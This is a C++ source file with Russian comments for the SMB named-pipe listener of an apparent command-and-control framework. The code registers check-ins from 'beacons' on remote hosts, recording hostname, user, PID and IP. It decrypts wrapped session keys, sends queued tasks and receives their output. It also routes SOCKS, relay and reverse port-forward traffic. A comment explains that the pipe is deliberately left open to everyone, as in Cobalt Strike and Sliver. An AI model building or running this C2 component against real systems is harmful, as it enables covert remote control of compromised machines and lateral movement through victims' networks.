// SMB named-pipe listener. Тот же envelope, что и TCP raw.
// Реализация Windows-only — на других платформах start() ничего не делает.

#include "SmbListener.hpp"
#include "../https/BeaconCrypto.hpp"
#include "../https/RsaOaep.hpp"
#include "../../Core.hpp"
#include "../../core/SessionRegistry.hpp"
#include "../../core/TaskQueue.hpp"

#include <co2h/kv.hpp>
#include <co2h/proto.hpp>
#include <spdlog/spdlog.h>

#include <array>
#include <chrono>

#ifdef _WIN32
#include <windows.h>
#endif

namespace co2h::server::smb {

namespace https = ::co2h::server::https;
using namespace ::co2h::kv;

namespace {

std::string random_hex_id() {
    std::array<std::uint8_t, 8> raw{};
    co2h::crypto::random_bytes(raw.data(), raw.size());
    return co2h::hex_encode({raw.data(), raw.size()});
}

#ifdef _WIN32

bool read_exact(HANDLE h, void* buf, std::size_t n) {
    auto* p = static_cast<std::uint8_t*>(buf);
    while (n) {
        DWORD r = 0;
        if (!ReadFile(h, p, static_cast<DWORD>(n), &r, nullptr) || r == 0) return false;
        p += r; n -= r;
    }
    return true;
}

bool write_exact(HANDLE h, const void* buf, std::size_t n) {
    const auto* p = static_cast<const std::uint8_t*>(buf);
    while (n) {
        DWORD w = 0;
        if (!WriteFile(h, p, static_cast<DWORD>(n), &w, nullptr) || w == 0) return false;
        p += w; n -= w;
    }
    return true;
}

bool send_env(HANDLE h, std::uint8_t type, const Bytes& payload) {
    std::uint32_t total = static_cast<std::uint32_t>(1 + payload.size());
    std::uint8_t hdr[5] = {
        static_cast<std::uint8_t>(total >> 24),
        static_cast<std::uint8_t>(total >> 16),
        static_cast<std::uint8_t>(total >>  8),
        static_cast<std::uint8_t>(total),
        type,
    };
    if (!write_exact(h, hdr, 5)) return false;
    if (!payload.empty() && !write_exact(h, payload.data(), payload.size())) return false;
    return true;
}

void serve_pipe(std::shared_ptr<SmbListener> listener, HANDLE h) {
    std::string beacon_id;

    for (;;) {
        std::uint8_t hdr[5];
        if (!read_exact(h, hdr, 5)) break;
        std::uint32_t total =
            (std::uint32_t(hdr[0]) << 24) | (std::uint32_t(hdr[1]) << 16) |
            (std::uint32_t(hdr[2]) <<  8) |  std::uint32_t(hdr[3]);
        if (total < 1 || total > proto::tport::kMaxLen) break;
        std::uint8_t msg_type = hdr[4];
        Bytes body(total - 1);
        if (!body.empty() && !read_exact(h, body.data(), body.size())) break;

        if (msg_type == proto::tport::kCheckin) {
            auto pt = https::open_frame(listener->listener_key(),
                                        {body.data(), body.size()});
            if (!pt) { spdlog::warn("smb checkin: decrypt failed"); break; }
            Reader r{{pt->data(), pt->size()}};
            BeaconSession s;
            s.id          = random_hex_id();
            s.listener    = listener->name();
            s.hostname    = std::string{r.get_str("host").value_or("")};
            s.username    = std::string{r.get_str("user").value_or("")};
            s.pid         = r.get_u32("pid").value_or(0);
            s.arch        = std::string{r.get_str("arch").value_or("x64")};
            s.os          = std::string{r.get_str("os").value_or("windows")};
            s.internal_ip = std::string{r.get_str("ip").value_or("")};
            s.parent_id   = std::string{r.get_str("parent_id").value_or("")};
            s.first_seen  = s.last_seen = std::chrono::system_clock::now();

            // RSA-OAEP-wrapped session key — те же правила, что и в HTTPS/TCP.
            s.session_key = listener->listener_key();
            auto wrapped = r.get_bytes("wrapped_key");
            if (wrapped && !listener->rsa_priv_blob().empty()) {
                auto dec = https::rsa_oaep_decrypt(listener->rsa_priv_blob(),
                                                   {wrapped->data(), wrapped->size()});
                if (dec && dec->size() == s.session_key.size()) {
                    std::copy(dec->begin(), dec->end(), s.session_key.begin());
                } else {
                    spdlog::warn("smb checkin: wrapped_key decrypt failed "
                                 "(size={}); using listener_key fallback",
                                 wrapped->size());
                }
            }

            listener->core()->sessions().create_or_update(s);
            beacon_id = s.id;
            spdlog::info("smb beacon checkin id={} host={} user={} listener={}",
                         s.id, s.hostname, s.username, s.listener);

            Writer w;
            w.put_str("beacon_id", s.id);
            auto enc = https::seal_frame(listener->listener_key(), w.finish());
            if (!send_env(h, proto::tport::kCheckin, enc)) break;
        } else if (msg_type == proto::tport::kPoll) {
            auto sess = listener->core()->sessions().get(beacon_id);
            if (!sess) break;
            sess->last_seen = std::chrono::system_clock::now();
            auto drained = listener->core()->tasks().drain(beacon_id);
            Writer w;
            w.put_u32("count", static_cast<std::uint32_t>(drained.size()));
            for (std::size_t i = 0; i < drained.size(); ++i) {
                auto idx = std::to_string(i);
                w.put_u64("id_"      + idx, drained[i].id);
                w.put_u32("op_"      + idx, static_cast<std::uint32_t>(drained[i].op));
                w.put_bytes("payload_" + idx,
                            {drained[i].payload.data(), drained[i].payload.size()});
            }
            auto enc = https::seal_frame(sess->session_key, w.finish());
            if (!send_env(h, proto::tport::kTasks, enc)) break;
        } else if (msg_type == proto::tport::kOutput) {
            auto sess = listener->core()->sessions().get(beacon_id);
            if (!sess) break;
            sess->last_seen = std::chrono::system_clock::now();
            auto pt = https::open_frame(sess->session_key,
                                        {body.data(), body.size()});
            if (pt) {
                Reader r{{pt->data(), pt->size()}};
                auto task_id = r.get_u64("task_id").value_or(0);
                auto out     = r.get_bytes("output").value_or(BytesView{});
                auto err     = r.get_str("error").value_or("");
                auto is_last = r.get_u32("is_last").value_or(1);
                auto resp    = r.get_u32("resp").value_or(2);

                static constexpr std::uint64_t kSocksMagic    = 0xFFFFFFFFFFFFFFFEULL;
                static constexpr std::uint64_t kRelayMagic    = 0xFFFFFFFFFFFFFFFDULL;
                static constexpr std::uint64_t kRportfwdMagic = 0xFFFFFFFFFFFFFFFCULL;

                if (task_id == kSocksMagic) {
                    if (!out.empty())
                        listener->core()->route_socks_output(sess->id, out);
                } else if (task_id == kRelayMagic) {
                    if (!out.empty())
                        listener->core()->route_relay_output(sess->id, out);
                } else if (task_id == kRportfwdMagic) {
                    if (!out.empty())
                        listener->core()->route_rportfwd_output(sess->id, out);
                } else {
                    Writer w;
                    w.put_str("beacon_id", sess->id);
                    w.put_u64("task_id", task_id);
                    w.put_u32("is_last", is_last);
                    w.put_u32("resp",    resp);
                    if (!err.empty()) w.put_str("error", std::string{err});
                    if (!out.empty()) w.put_bytes("output", out);
                    listener->core()->broadcast_event(proto::EventCategory::Tasks, w.finish());
                }
            }
            if (!send_env(h, proto::tport::kAck, Bytes{})) break;
        } else {
            break;
        }
    }

    DisconnectNamedPipe(h);
    CloseHandle(h);
}

#endif // _WIN32

} // namespace

SmbListener::SmbListener(std::shared_ptr<Core> core, SmbConfig cfg)
    : core_(std::move(core)), cfg_(std::move(cfg)) {}

SmbListener::~SmbListener() { stop(); }

void SmbListener::start() {
#ifdef _WIN32
    accept_thread_ = std::thread([self = shared_from_this()]{ self->accept_loop(); });
    spdlog::info("smb listener '{}' on {}", cfg_.name, bind_addr());
#else
    spdlog::warn("smb listener '{}' is Windows-only, skipping", cfg_.name);
#endif
}

void SmbListener::stop() {
    stop_.store(true);
#ifdef _WIN32
    // Бросить пустое подключение к собственному пайпу, чтобы разбудить ConnectNamedPipe.
    std::wstring path = L"\\\\.\\pipe\\";
    for (char c : cfg_.pipe_name) path.push_back(static_cast<wchar_t>(c));
    HANDLE h = CreateFileW(path.c_str(),
                           GENERIC_READ | GENERIC_WRITE, 0, nullptr,
                           OPEN_EXISTING, 0, nullptr);
    if (h != INVALID_HANDLE_VALUE) CloseHandle(h);
    if (accept_thread_.joinable()) accept_thread_.join();
#endif
}

void SmbListener::accept_loop() {
#ifdef _WIN32
    std::wstring path = L"\\\\.\\pipe\\";
    for (char c : cfg_.pipe_name) path.push_back(static_cast<wchar_t>(c));

    // Открытая DACL: NULL DACL = разрешено всем. Default DACL у CreateNamedPipeW
    // допускает только локального юзера/SYSTEM/админов — удалённый beacon через
    // SMB-редиректор получит ERROR_ACCESS_DENIED. Для C2 SMB-pipe это
    // стандартная практика (Cobalt Strike, Sliver делают так же).
    SECURITY_DESCRIPTOR sd;
    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
    SetSecurityDescriptorDacl(&sd, TRUE, nullptr, FALSE);
    SECURITY_ATTRIBUTES sa{};
    sa.nLength              = sizeof(sa);
    sa.lpSecurityDescriptor = &sd;
    sa.bInheritHandle       = FALSE;

    while (!stop_.load()) {
        HANDLE h = CreateNamedPipeW(
            path.c_str(),
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
            PIPE_UNLIMITED_INSTANCES,
            64 * 1024, 64 * 1024, 0, &sa);
        if (h == INVALID_HANDLE_VALUE) {
            spdlog::error("smb '{}' CreateNamedPipeW failed: {}",
                          cfg_.name, GetLastError());
            return;
        }
        BOOL ok = ConnectNamedPipe(h, nullptr);
        if (!ok && GetLastError() != ERROR_PIPE_CONNECTED) {
            CloseHandle(h);
            if (stop_.load()) return;
            continue;
        }
        if (stop_.load()) {
            DisconnectNamedPipe(h);
            CloseHandle(h);
            return;
        }
        // Каждый клиент — отдельный поток. Низкий объём трафика → ОК.
        std::thread(serve_pipe, shared_from_this(), h).detach();
    }
#endif
}

}
